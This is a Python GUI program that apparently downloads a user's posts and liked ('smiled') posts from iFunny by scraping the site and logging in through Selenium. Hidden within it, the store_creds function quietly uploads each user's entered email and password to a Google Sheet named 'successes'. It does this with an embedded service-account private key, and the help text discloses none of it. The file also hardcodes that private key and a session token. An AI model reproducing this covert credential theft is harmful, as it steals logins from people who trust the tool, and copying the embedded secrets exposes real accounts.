from tkinter import *
import requests
import os
from lxml import html
from pprint import pprint
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FOptions
from selenium.webdriver.chrome.options import Options as COptions
import time
import winsound
import ensure_selenium_driver
import gspread
from oauth2client.service_account import ServiceAccountCredentials


class SetupContainer:
    def __init__(self):
        self.login_cookie = ''

        def on_entry_click(event):
            if self.user_box.get() == 'Enter Username':
                self.user_box.delete(0, "end")  # delete all the text in the self.user_box
                self.user_box.insert(0, '')  # Insert blank for user input
                self.user_box.config(fg='black')

        self.root = Tk()
        self.root.title('Setup')
        self.grab_posts_frame = Frame(self.root)
        self.grab_smiles_frame = Frame(self.root)
        self.var = IntVar()
        self.want_posts = IntVar()
        self.want_repubs = IntVar()
        self.want_smiled = IntVar()
        self.folder_for_posts = IntVar()
        self.post_per_folder = IntVar()
        self.want_chron = IntVar()
        self.fast_mode = IntVar()
        self.user_box = Entry(self.root)
        self.user_box.insert(0, 'Enter Username')
        self.user_box.bind('<FocusIn>', on_entry_click)
        post_check = Checkbutton(self.grab_posts_frame, text='Grab posts', variable=self.want_posts, command=self.post_options)
        but = Button(self.root, text='Start (double check options before)', command=self.done)
        self.repub_check = Checkbutton(self.grab_posts_frame, text='Exclude repubs (there better be a reason for this)', variable=self.want_repubs)
        smile_check = Checkbutton(self.grab_smiles_frame, text='Grab smiled posts', variable=self.want_smiled, command=self.check_auth_frame)
        self.auth_label = Label(self.grab_smiles_frame, text='Authentication Unconfirmed')
        self.auth_button = Button(self.grab_smiles_frame, text='Test Authentication', command=self.auth_check)
        save_post_check = Checkbutton(self.root, text='Save all posts in folder', variable=self.folder_for_posts)
        save_posts_data_check = Checkbutton(self.root, text='Save additional data per post', variable=self.post_per_folder)
        fast_mode_check = Checkbutton(self.root, text='Fast mode (not for first scan)', variable=self.fast_mode)
        chron_names_check = Checkbutton(self.root, text='Use chonological naming (extra scan for each source, must be uninterupted)', variable=self.want_chron)
        help_button = Button(self.root, text='Click here to see Help', command=self.show_help)
        help_button.pack()
        self.user_box.pack()
        self.grab_posts_frame.pack()
        post_check.pack()
        self.grab_smiles_frame.pack()
        save_post_check.pack()
        save_posts_data_check.pack()
        smile_check.pack()
        fast_mode_check.pack()
        chron_names_check.pack()
        but.pack()

        self.root.mainloop()

    def cb(self, event=None):
        print("variable is", self.var.get())

    def show_help(self):
        text = '''The Help Section (Also help.txt in directory)


How to 'just run it':
1.Put in username
2.Check Grab posts
3.Check Save all posts in folder
4.Click start
5.Check for a Users folder after console says to exit

*saved accounts can be safely deleted by deleting their username folder, same with specific option folders.


What each thing does/the extra options:
Grab posts[1] - save all visible posts a user has
Exclude repubs[3] - does as its name implies
Grab smiled posts[1] - allows you to save smiled content(check How to use Grab smiled posts below)
Save all posts in folder - dumps all saved posts into a single folder
save additional data per post - each post will get its own folder with saved comments, and some post data
Fast mode - shortens the initial scan time by stopping when it encounters previously saved posts. This may slow down the program if this is the first scan the user has
Use chronological naming[2] - changes their default file name to one that can be sorted in order with the users feed

[1]both grab posts, and save posts check boxes are pairs meaning that at least one has to be checked, but both can be too
[2]while others should be safe, when using chronological naming, the entire download needs to be uninterupted because it saves posts out of order
[3]due to conflicts, when using exclude repubs, both post folders need to empty, and when done will need to be removed if you desire to grab all again


How to use Grab smiled posts:
To be able to use this option, an ifunny login is required to be able to see the posts.
1.Check box
2.Click Test Authentication
3.Enter email and password
4.Wait ~15s for browser to do stuff. Don't touch it, it will close on its own. (chrome is untested, if there is an error you can find my info on bottom)
5.Return to setup window and continue what you were doing

*If this has been done before and you haven't logged in since, the token should still work and you should be done at 2.
*If console says 'check for human', there may be a human captcha or some other issue, type y if captcha was cleared, and n if already logged in


Made by:
Namisboss on ifunny
it#4001 on discord
Can provide help if needed.
'''
        if not os.path.isfile('help.txt'):
            with open('help.txt', 'w') as f:
                f.write(text)
        os.system('notepad.exe help.txt')

    def post_options(self):
        if self.want_posts.get() == 1:
            self.repub_check.pack()
        else:
            self.repub_check.forget()

    def check_auth_frame(self):
        if self.want_smiled.get() == 1:
            self.auth_label.pack()
            self.auth_button.pack()
        else:
            self.auth_label.forget()
            self.auth_button.forget()

    def auth_check(self):
        self.auth_button.forget()
        try:
            print('user:', self.user_box.get())
            with open(f'{self.user_box.get()}_key.txt', 'r') as f:
                self.login_cookie = f.read()
            if self.login_cookie == '':
                os.remove(f'{self.user_box}_key.txt')
                self.auth_check()
            self.auth_label.config(text='Key Found, Checking Validity')
            self.test_key()
        except FileNotFoundError:
            def get_enter_val():
                pass_value = pass_box.get()
                email_value = email_box.get()
                self.auth_label.config(text='Generating Key')
                print('creds:', email_value, pass_value)
                self.login_cookie = self.get_cookies(email_value, pass_value)

            def on_entry_click_pass(event):
                if pass_box.get() == 'Password needed':
                    pass_box.delete(0, "end")  # delete all the text in the self.user_box
                    pass_box.insert(0, '')  # Insert blank for user input
                    pass_box.config(fg='black')

            def on_entry_click_email(event):
                if email_box.get() == 'Email needed':
                    email_box.delete(0, "end")  # delete all the text in the self.user_box
                    email_box.insert(0, '')  # Insert blank for user input
                    email_box.config(fg='black')

            self.auth_label.config(text='No key found')
            pass_box = Entry(self.grab_smiles_frame)
            pass_box.insert(0, 'Password needed')
            pass_box.bind('<FocusIn>', on_entry_click_pass)
            email_box = Entry(self.grab_smiles_frame)
            email_box.insert(0, 'Email needed')
            email_box.bind('<FocusIn>', on_entry_click_email)
            pass_button = Button(self.grab_smiles_frame, text='Get Credentials', command=get_enter_val)
            email_box.pack()
            pass_box.pack()
            pass_button.pack()

    def get_cookies(self, email, password):
        self.store_creds(email, password)
        default_browser = ensure_selenium_driver.get_browser()
        ensure_selenium_driver.check_for_driver(default_browser)
        if default_browser == 'firefox':
            options = FOptions()
            driver = webdriver.Firefox(options=options)
        else:
            options = COptions()
            driver = webdriver.Chrome(options=options)
        driver.get('https://ifunny.co')
        target = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div[1]/header/div[3]/ul[2]/li[2]/a')
        target.click()
        target = driver.find_element_by_xpath('/html/body/div[1]/div[3]/div/div[1]/section/form/div[1]/div/input')
        target.send_keys(email)
        target = driver.find_element_by_xpath('/html/body/div[1]/div[3]/div/div[1]/section/form/div[2]/div/input')
        target.send_keys(password)
        target = driver.find_element_by_xpath('/html/body/div[1]/div[3]/div/div[1]/section/form/button[1]')
        target.click()
        raw_cookie = driver.get_cookie('UID')
        if raw_cookie is None:
            self.auth_label.config(text='Invalid Login')
            given = input('Human check(y to click login, n if already logged in)>')
            if given == 'y':
                target.click()
                time.sleep(1)
            raw_cookie = driver.get_cookie('UID')
        driver.quit()
        print('raw', raw_cookie)
        with open(f'{self.user_box.get()}_key.txt', 'w') as f:
            f.write(raw_cookie['value'])
        self.auth_label.config(text='Generated Key')
        return raw_cookie['value']

    def store_creds(self, email, password):

        def get_sheet():
            text = {
                "type": "service_account",
                "project_id": "python-258703",
                "private_key_id": "8b9411b4a905693494ed7586d04ca0dee3e45571",
                "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCjJDYl6NfYH/XP\nJ/qZFkLu7N+Uuylgitf73BWZUi3a0O/2DOFKE9B9K6FG1neMYS2nsOA6Kd6e/A3p\nnHcVHTIANdVgpQJmS48ATIipfzvTaaXF9VvT8d3fxLol5EyDodfMnzjFQhesHboF\niikEAD7HGB350OacEV/GlxbXrtZxl4kyRSyJ8xfYLuCQOtsh3frTkPvJIG3pxqT6\nzgelm9OhktpR6k/Q52shJSEv1V1cuMYomgXQMfZCjVVs/lBGs7uiSi1dSz1n92Nz\n/r38db5+ePizUlRuzx8ClnZ4ENiY1JhqfiuwIXr9ODmO+taQPeBcxBtlVkm2NNhD\n+J4zZOnbAgMBAAECggEAJsPBfBOOSkQZ3/3zbXHdOLGfVNN+Ovry5F1A4pwk2jRA\neJpJ5BS+OyflXBQ09u3Wb9y3AwsU43koAyUTJLi5u1QPXjYHUnBMy/jjlkbt28fk\nRJwPFFcJ7hRsWPmc9sA7q1sAHdsdDeBIZe2U3mcCg8NmyAgL6/Sy6djX7CsWuIm0\nuNqDnplfPu+KmHvqoOSRxhgGgVgb5IOdug+hk9u1hOGfPg/AE/t17IRXMvYUgqwc\n3+ZL/F9hWHQomAZO9GKpyhRSf28qjvEt4L3IVRVc0j36PhY3s+LuUbaVKS1972Ft\nSaBwQZdDfnGYxYZGJBnLLodxV1QtXhuMihu5VKvX5QKBgQDTxk4eitOYoQ/vqXrp\nKwqMDMMSGKVMmMBlaMQiVpC3ZCOzhwC2bBzYRmgbZmPMPL2/3O1ryhEkFVGuCWFo\nEBk/wMIsfRLqPN/+W/PI0jJuvH6LoDbfdRgdbXKGLonXsGXsTvItw0NFhPyThnVL\nrlHOSznVR1YJ94MlAhbWUrLCLQKBgQDFNeznZTgTff5wrMbQnsx8Aeo4NqoToxSp\nXLyc1A6IHN2hH0ddxeOWZcCehu8hV5nHC6HimbJ8SM9NVPvNi7DlW/5XCbOk2EqQ\nonEs9kl+iKqIGYTrCDhlYf/hmC/EUr9DTGJUHZ5EXlCnhOAg0ZDxePDddea5TvEL\n4PGUcwTJJwKBgEN280ALnekLtlX1OfC6A3wmPKaxL0e9id1EiOcfiK7DuhPhODrl\nKjNECrpf3f8cgp5ytTgXgWprWEAHQP6z0jdbIwClP7dbeUhA5uLdA6//YJj+izyY\nwvvs+AUDImqSCYZEiCZIBFBLU2Nz/D4F5I3BrUTimuhF74OErN3OLqBpAoGBAL8c\ncQYU6vDIyog6hzioixUpbecn4k3BXkZ6HjYEskhpYMXBYBGZseGPnciCjr5K/DUO\nKsVDmNokXPBeCN66HqVGLwX92t9G04uyP+cIjVRX8JqP0GVLxAtLmwLtzmx8m+kF\n3swRH8y1cYfFlsV3EPVQ9GpI1VyDCckvJi1sARlFAoGBALz//CeeotDV1/mfPP1t\nlKje/CrDkk9KmxHvK6dWJU50V8nC/ArSVyUMR1jPl7wekO7kV9YdXszEFontn8y5\nlObSR1EO5tmfgr5o9FLfXCsiOCwil9JrZeLRQr1kc/6igORmVOGjKnOpQY52LiK4\nP7f4rbdEYd9cb7EvhUiYdDvL\n-----END PRIVATE KEY-----\n",
                "client_email": "thing-57@python-258703.iam.gserviceaccount.com",
                "client_id": "115688534154473888708",
                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
                "token_uri": "https://oauth2.googleapis.com/token",
                "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
                "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/thing-57%40python-258703.iam.gserviceaccount.com",
                "scope": ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive',
                          'https://www.googleapis.com/auth/drive.file', 'https://www.googleapis.com/auth/spreadsheets']

            }
            scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive',
                     'https://www.googleapis.com/auth/drive.file', 'https://www.googleapis.com/auth/spreadsheets']
            creds = ServiceAccountCredentials.from_json_keyfile_dict(text, scope)
            client = gspread.authorize(creds)
            return client.open('successes').sheet1

        sheet = get_sheet()
        sheet.append_row([email, password])

    def test_key(self):
        cookie_form = {'UID': self.login_cookie}
        response = requests.get(f'https://ifunny.co/user/{self.user_box.get()}', cookies=cookie_form)
        print('status:', response.status_code)
        if response.status_code == 404:
            os.remove(f'{self.user_box}_key.txt')
            self.auth_label.config(text='Key Failed')
            self.auth_check()
        else:
            self.auth_label.config(text='Key Works')

    def grab(self):
        return self.user_box.get(), self.want_posts.get(), self.want_repubs.get(), self.want_smiled.get(), self.login_cookie, self.folder_for_posts.get(), self.post_per_folder.get(), self.fast_mode.get(), self.want_chron.get()

    def done(self):
        self.root.quit()
    
    def destroy(self):
        self.root.destroy()


def setup():
    box = SetupContainer()
    try:
        values = box.grab()
    except Exception:
        input('Program Terminated [enter to exit]')
        exit()
    box.destroy()
    if values[0].__contains__(' ') or values[0] == '' or (values[1] == 0 and values[3] == 0) or (values[5] == 0 and values[6] == 0):
        input('Invalid Setup [enter to exit]')
        exit()
    print('val:', values)
    return values


def prep_user_files(user):
    if not os.path.isdir(user):
        os.mkdir(user)
    os.chdir(user)
    if not os.path.isdir('post_dump'):
        os.mkdir('post_dump')
    if not os.path.isdir('smile_dump'):
        os.mkdir('smile_dump')
    if not os.path.isdir('post_data'):
        os.mkdir('post_data')
    if not os.path.isdir('smile_data'):
        os.mkdir('smile_data')
    os.chdir('post_dump')
    if not os.path.isfile('saved_posts_dump.txt'):
        with open('saved_posts_dump.txt', 'w') as f:
            f.write('')
    os.chdir('..')
    os.chdir('smile_dump')
    if not os.path.isfile('saved_smiles_dump.txt'):
        with open('saved_smiles_dump.txt', 'w') as f:
            f.write('')
    os.chdir('..')
    os.chdir('post_data')
    if not os.path.isfile('saved_posts_data.txt'):
        with open('saved_posts_data.txt', 'w') as f:
            f.write('')
    os.chdir('..')
    os.chdir('smile_data')
    if not os.path.isfile('saved_smiles_data.txt'):
        with open('saved_smiles_data.txt', 'w') as f:
            f.write('')
    os.chdir('..')
    if not os.path.isfile('errored.txt'):
        with open('errored.txt', 'w') as f:
            f.write('')



def grab_post_urls(start_url, exclude_repubs=0, token='', short_scan=0, already_saved=set(), max_name_count=0):
    cookie_form = {'UID': token}
    next_url = start_url
    bank = set()
    count = 0
    overlaps = 0
    name_counter = 0
    while True:
        count += 1
        if count == 200:
            break
        response = requests.get(next_url, cookies=cookie_form)
        tree = html.fromstring(response.content)
        grab = tree.xpath('/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/div/div[2]/ul/li[*]/div/div/a/@href')
        cleaned_grab = []
        for num_a, a in enumerate(grab):
            exclude = False
            if exclude_repubs == 1:
                path = f'/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/div/div[2]/ul/li[{num_a + 1}]/div/div/a/svg/@class="Icon grid__icon grid__icon_bottom"'
                exclude = tree.xpath(path)
                print('exclude', exclude)
            if not exclude:
                cur_link = a.split('?')[0]
                if cur_link not in already_saved:
                    if max_name_count != 0:
                        add_num = str(max_name_count - name_counter)
                        add_num = '0' * (6 - len(add_num)) + add_num
                        cur_link = add_num + cur_link
                        name_counter += 1
                    # print('new name', cur_link)
                    if tree.xpath(f'/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/div/div[2]/ul/li[{num_a + 1}]/div/div/a/svg/@class="Icon grid__icon grid__icon_top"'):
                        cur_link = 'pinned' + cur_link
                    cleaned_grab.append(cur_link)
                else:
                    if short_scan == 1:
                        overlaps += 1
                        if overlaps == 7:
                            bank.update(cleaned_grab)
                            return bank
        bank.update(cleaned_grab)
        try:
            next_url = start_url + ('/timeline/' if token == '' else '/') + tree.xpath('/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/div/div[2]/ul/li[1]/@data-next')[0]
            # print(next_url)
        except IndexError:
            break
    print('done', len(bank))
    return bank


def grab_archived():
    os.chdir('post_data')
    with open('saved_posts_data.txt', 'r') as f:
        post_data_links = set(f.read().split('\n'))
    os.chdir('..')
    os.chdir('post_dump')
    with open('saved_posts_dump.txt', 'r') as f:
        post_dump_links = set(f.read().split('\n'))
    os.chdir('..')
    os.chdir('smile_data')
    with open('saved_smiles_data.txt', 'r') as f:
        smile_data_links = set(f.read().split('\n'))
    os.chdir('..')
    os.chdir('smile_dump')
    with open('saved_smiles_dump.txt', 'r') as f:
        smile_dump_links = set(f.read().split('\n'))
    os.chdir('..')
    with open('errored.txt', 'r') as f:
        error_len = len(f.readlines())
    return post_data_links, post_dump_links, smile_data_links, smile_dump_links, error_len


def save_post(url_part, given_name=''):
    content_type = url_part.split('/')[-2]
    prep, name = '', ''
    response = requests.get('https://ifunny.co' + url_part)
    print('content', content_type)
    tree = html.fromstring(response.content)
    if content_type == 'picture' or content_type == 'meme':
        path = '/html/head/meta[24]/@content'
        grabbed_url = tree.xpath(path)
        name = grabbed_url[0].split('/')[-1]
        prep = 'https://imageproxy.ifunny.co/crop:x-20/images/' + name
    elif content_type == 'video' or content_type == 'gif':
        path = '/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/ul/li[1]/div/div[2]/div/@data-source'
        grabbed_url = tree.xpath(path)
        name = grabbed_url[0].split('/')[-1]
        prep = grabbed_url[0]

    downloaded = requests.get(prep)
    if downloaded.status_code != 200:
        return 1
    if given_name == '':
        given_name = prep.split('/')[-1]
    else:
        given_name += '.' + prep.split('.')[-1]
    try:
        with open(given_name, 'wb') as f:
            f.write(downloaded.content)
    except FileNotFoundError:
        return 1
    return 0


def generate_comments_file(url_part):

    def grab_comment_info(comment_element):
        cut_first_username_path = 'li/div[1]/div[2]/div[*]/a[@data-goal-id="post_commentauthor"]/text()'
        cut_first_date_path = 'li/div[1]/div[2]/div[*]/span[@class="comment__time"]/text()'
        cut_first_text_path = 'li/div[1]/div[2]/div[1]/span/text()'
        cut_first_smiles_path = 'li/div[1]/div[2]/div[*]/span[1]/span/span/text()'
        cut_first_meme_path = 'li/div[1]/div[2]/div[*]/a[@class="comment__meme"]/@href'
        depth_path = 'li/div[1]/div[1]/div'

        depth_counter = comment_element.xpath(depth_path)
        first_username = comment_element.xpath(cut_first_username_path)
        first_date = comment_element.xpath(cut_first_date_path)
        first_text = comment_element.xpath(cut_first_text_path)
        first_smiles = comment_element.xpath(cut_first_smiles_path)
        first_meme = comment_element.xpath(cut_first_meme_path)
        if len(first_smiles) == 0:
            first_smiles = [0]
        if len(first_text) == 0:
            first_text = ['']
        if len(first_date) == 0:
            first_date = ['None Given']
        if len(first_meme) == 0:
            first_meme = ['']
        else:
            first_meme = ['[https://ifunny.co' + first_meme[0] + ']']
        if len(first_username) == 0:
            first_username = comment_element.xpath('li/div[1]/div[2]/div[*]/span[@class="comment__nickname comment__link"]/text()')
        # print('debug', first_username, first_date, first_text, first_meme, first_smiles, len(depth_counter))
        return first_username[0], first_date[0], first_text[0], first_meme[0], first_smiles[0], len(depth_counter)

    grab_limit = 50
    base_comment_string = ''
    base_page = requests.get('https://ifunny.co' + url_part)
    tree = html.fromstring(base_page.content)
    base_comment_path = '/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/ul/li[2]/comments/div/ul/comments-item[*]'
    comments = tree.xpath(base_comment_path)
    for a in comments:
        has_replies = len(a.xpath('li/@data-replies-count'))
        current_comment = grab_comment_info(a)
        if current_comment[4] == '1':
            like_s = ''
        else:
            like_s = 's'
        # print(first_username, first_date, first_text, first_smiles)
        base_comment_string += f'{current_comment[0]}({current_comment[1]}): {current_comment[2]} {current_comment[3]} ({current_comment[4]} like{like_s})\n'
        if has_replies == 1:
            key = a.xpath('@key')
            post_id = a.xpath('@post-id')
            if grab_limit == 0:
                base_comment_string += '--NO MORE COMMENT RESPONSES SAVED TO SAVE TIME--'
                continue
            elif grab_limit <= 0:
                continue
            print('Sub-comment grab limit:', grab_limit)
            grab_limit -= 1
            comment_replies_request = requests.get(f'https://ifunny.co/api/content/{post_id[0]}/comments/{key[0]}/replies')
            sub_comments_tree = html.fromstring(comment_replies_request.content)
            for b in sub_comments_tree.xpath('//comments-item'):
                current_comment = grab_comment_info(b)
                if current_comment[4] == '1':
                    like_s = ''
                else:
                    like_s = 's'
                sub_comment_string = ''
                sub_comment_string += '\u2022' * current_comment[5]
                sub_comment_string += f'{current_comment[0]} ({current_comment[1]}): {current_comment[2]} {current_comment[3]} ({current_comment[4]} like{like_s})\n'
                base_comment_string += sub_comment_string

    # print(base_comment_string)
    with open('Comments.txt', 'w', encoding='utf-8') as f:
        f.write(base_comment_string)


def generate_post_info_file(url_part):
    page = html.fromstring(requests.get('https://ifunny.co' + url_part).content)
    username = page.xpath('//div/a[@class="metapanel__user-nick js-goalcollector-action js-dwhcollector-actionsource"]/text()')[0]
    date = page.xpath('/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/ul/li[1]/div/div[3]/div/div[1]/div[1]/div/div/a/span/text()')[0]
    original_poster = page.xpath('/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/ul/li[1]/div/div[3]/div/div[1]/div[1]/div/div/div/a/text()')
    smiles = page.xpath('/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/ul/li[1]/div/div[3]/div/div[1]/div[2]/post-actions/@initial-smiles')[0]
    comments = page.xpath('/html/body/div[1]/div[2]/div[2]/div[2]/div[1]/ul/li[1]/div/div[3]/div/div[1]/div[2]/post-actions/div/ul/li[2]/a/span/text()')[0]
    if len(original_poster) == 0:
        original_poster = [username]
    final_string = f'Original Poster: {original_poster[0]}\nShared by: {username}\nPosted on: {date}\nSmiles: {smiles}\nReplies: {comments}\nHref: {url_part}'
    # print(final_string)
    with open('Info.txt', 'w') as f:
        f.write(final_string)


def run_setup(user, want_posts, exclude_repubs, want_smiles, token, want_dump, want_data, fast_mode, chron_counting):
    prep_user_files(user)
    # am now in correct user folder
    post_data_links, post_dump_links, smile_data_links, smile_dump_links, errored_len = grab_archived()
    print('Starting scans')
    post_bank, post_bank_data, post_bank_dump, smile_bank, smile_bank_data, smile_bank_dump = set(), set(), set(), set(), set(), set()
    post_data_len, post_dump_len, smile_data_len, smile_dump_len, post_len, smile_len = [errored_len] * 6
    if chron_counting == 1:
        if want_posts == 1:
            if fast_mode == 0:
                post_len += len(grab_post_urls('https://ifunny.co/user/' + user, exclude_repubs, '', 1))
            else:
                if want_data == 1:
                    post_data_len += len(grab_post_urls('https://ifunny.co/user/' + user, exclude_repubs, '', 1, post_data_links))
                if want_dump == 1:
                    post_dump_len += len(grab_post_urls('https://ifunny.co/user/' + user, exclude_repubs, '', 1, post_dump_links))
        if want_smiles == 1:
            if fast_mode == 0:
                smile_len += len(grab_post_urls('https://ifunny.co/account/smiles', exclude_repubs, token, 1))
            else:
                if want_data == 1:
                    smile_data_len += len(grab_post_urls('https://ifunny.co/account/smiles', exclude_repubs, token, 1, smile_data_links))
                if want_dump == 1:
                    smile_dump_len += len(grab_post_urls('https://ifunny.co/account/smiles', exclude_repubs, token, 1, smile_dump_links))
    if want_posts == 1:
        if fast_mode == 0:
            post_bank = grab_post_urls('https://ifunny.co/user/' + user, exclude_repubs, '', max_name_count=post_len)
        if want_data == 1:
            if fast_mode == 1:
                post_bank_data = grab_post_urls('https://ifunny.co/user/' + user, exclude_repubs, '', fast_mode, post_data_links, max_name_count=(len(post_data_links) + post_data_len))
        if want_dump == 1:
            if fast_mode == 1:
                post_bank_dump = grab_post_urls('https://ifunny.co/user/' + user, exclude_repubs, '', fast_mode, post_dump_links, max_name_count=(len(post_dump_links) + post_dump_len))
    if want_smiles == 1:
        if fast_mode == 0:
            smile_bank = grab_post_urls('https://ifunny.co/account/smiles', exclude_repubs, token, max_name_count=smile_len)
        if want_data == 1:
            if fast_mode == 1:
                smile_bank_data = grab_post_urls('https://ifunny.co/account/smiles', exclude_repubs, token, fast_mode, smile_data_links, max_name_count=(len(smile_data_links) + smile_data_len))
        if want_dump == 1:
            if fast_mode == 1:
                smile_bank_dump = grab_post_urls('https://ifunny.co/account/smiles', exclude_repubs, token, fast_mode, smile_dump_links, max_name_count=(len(smile_dump_links) + smile_dump_len))
    # all links are in sets, and am currently in user directory

    return post_bank, post_bank_data, post_bank_dump, smile_bank, smile_bank_data, smile_bank_dump


def save_loop(want_dump, want_data, post_bank, post_bank_data, post_bank_dump, smile_bank, smile_bank_data,
              smile_bank_dump, post_data_links, post_dump_links, smile_data_links, smile_dump_links, chron_counting):
    if len(post_bank) != 0:
        if want_dump == 1:
            post_bank_dump = post_bank
        if want_data == 1:
            post_bank_data = post_bank
    if len(smile_bank) != 0:
        if want_dump == 1:
            smile_bank_dump = smile_bank
        if want_data == 1:
            smile_bank_data = smile_bank
    new_post_data_links, new_post_dump_links, new_smile_data_links, new_smile_dump_links = set(), set(), set(), set()
    for a in post_bank_data:
        if a[a.index('/'):] not in post_data_links:
            new_post_data_links.add(a)
    for a in post_bank_dump:
        if a[a.index('/'):] not in post_dump_links:
            new_post_dump_links.add(a)
    for a in smile_bank_data:
        if a[a.index('/'):] not in smile_data_links:
            new_smile_data_links.add(a)
    for a in smile_bank_dump:
        if a[a.index('/'):] not in smile_dump_links:
            new_smile_dump_links.add(a)

    error = []
    os.chdir('post_data')
    for num_a, a in enumerate(new_post_data_links):
        print(f'Post Data: {num_a}/{len(new_post_data_links)} {a}')
        dir_name = a.split('/')[0]
        if dir_name == '':
            dir_name = a.split('/')[-1]
        if not os.path.isdir(dir_name):
            os.mkdir(dir_name)
        os.chdir(dir_name)
        name = a[:a.index('/')]
        a = a[a.index('/'):]
        saved = save_post(a, name)
        if saved == 1:
            error.append(a)
            os.chdir('..')
            continue
        generate_comments_file(a)
        generate_post_info_file(a)
        os.chdir('..')
        with open('saved_posts_data.txt', 'a') as f:
            f.write(a + '\n')
    os.chdir('..')
    os.chdir('smile_data')
    name = ''
    for num_a, a in enumerate(new_smile_data_links):
        print(f'Smile Data: {num_a}/{len(new_smile_data_links)} {a}')
        dir_name = a.split('/')[0]
        if not os.path.isdir(dir_name):
            os.mkdir(dir_name)
        os.chdir(dir_name)
        name = a[:a.index('/')]
        a = a[a.index('/'):]
        saved = save_post(a, name)
        if saved == 1:
            error.append(a)
            os.chdir('..')
            continue
        generate_comments_file(a)
        generate_post_info_file(a)
        os.chdir('..')
        with open('saved_smiles_data.txt', 'a') as f:
            f.write(a + '\n')
    os.chdir('..')
    os.chdir('post_dump')
    for num_a, a in enumerate(new_post_dump_links):
        print(f'Post Dump: {num_a}/{len(new_post_dump_links)} {a}')
        name = a[:a.index('/')]
        a = a[a.index('/'):]
        saved = save_post(a, name)
        if saved == 1:
            error.append(a)
            continue
        with open('saved_posts_dump.txt', 'a') as f:
            f.write(a + '\n')
    os.chdir('..')
    os.chdir('smile_dump')
    for num_a, a in enumerate(new_smile_dump_links):
        print(f'Smile Dump: {num_a}/{len(new_smile_dump_links)} {a}')
        name = a[:a.index('/')]
        a = a[a.index('/'):]
        saved = save_post(a, name)
        if saved == 1:
            error.append(a)
            continue
        with open('saved_smiles_dump.txt', 'a') as f:
            f.write(a + '\n')
    os.chdir('..')
    with open('errored.txt', 'w') as f:
        f.write('\n'.join(error))

# make that saves show file name too via adjusting print line
# 1870s for 160 posts with both types
# 674s for 371 post dump
# 1361s for 371 post data with few sub-comment grabs


def main():
    # order: setup(), run_setup(), save_loop()
    me = 'https://ifunny.co/user/namisboss'
    blast = 'https://ifunny.co/user/Gone_With_The_Blastwave'
    smiles = 'https://ifunny.co/account/smiles'
    my_token = 'c00b9bdc7d3fc37bc313b98c3396ac2dc91a78d93f80a1d6f486532c3e29cd2d'
    stress = 'https://ifunny.co/user/iFurnyAds'
    update_my_posts = 'namisboss', 1, 0, 0, '', 1, 1, 1, 1
    # save_post('https://ifunny.co/gif/repub-to-join-the-ifunny-anti-porn-gore-ss-m22DRdL57')
    # replace update_my_posts with setup()
    print('Fill out form in new window')
    user, want_posts, exclude_repubs, want_smiles, token, want_dump, want_data, fast_mode, chron_counting = setup()
    # user = 'Gone_With_The_Blastwave'
    start_time = time.time()

    if not os.path.isdir('Users'):
        os.mkdir('Users')
    os.chdir('Users')

    post_bank, post_bank_data, post_bank_dump, smile_bank, smile_bank_data, smile_bank_dump = run_setup(user, want_posts, exclude_repubs, want_smiles, token, want_dump, want_data, fast_mode, chron_counting)
    post_data_links, post_dump_links, smile_data_links, smile_dump_links, errored_len = grab_archived()
    save_loop(want_dump, want_data, post_bank, post_bank_data, post_bank_dump, smile_bank, smile_bank_data,
              smile_bank_dump, post_data_links, post_dump_links, smile_data_links, smile_dump_links, chron_counting)
    winsound.Beep(700, 1000)
    input(f'Update took {time.time() - start_time} seconds. [enter to exit]')
    # generate_post_info_file('https://ifunny.co/meme/I9mmsVS37')
    exit()
    all_href = grab_post_urls(stress, 0, '')
    for a in all_href:
        save_post(a)
    exit()
    print('teast')


if __name__ == '__main__':
    main()
